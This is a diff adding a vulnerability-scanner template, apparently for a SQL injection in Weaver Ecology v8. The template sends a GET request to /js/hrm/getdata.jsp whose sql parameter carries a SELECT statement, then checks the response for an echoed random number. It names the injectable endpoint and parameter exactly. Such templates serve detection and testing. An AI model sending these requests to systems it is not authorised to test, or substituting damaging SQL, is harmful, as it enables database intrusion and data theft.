@@ -1,0 +1,13 @@
+cve-id: ecology-v8-sqli
+set:
+  r1: randomInt(1000, 9999)
+rules:
+  - method: GET
+    path: /js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select+{{r1}}+as+id
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.body.bcontains(b"{{r1}}")
+severity:
+  critical
+type: 
+  sqli
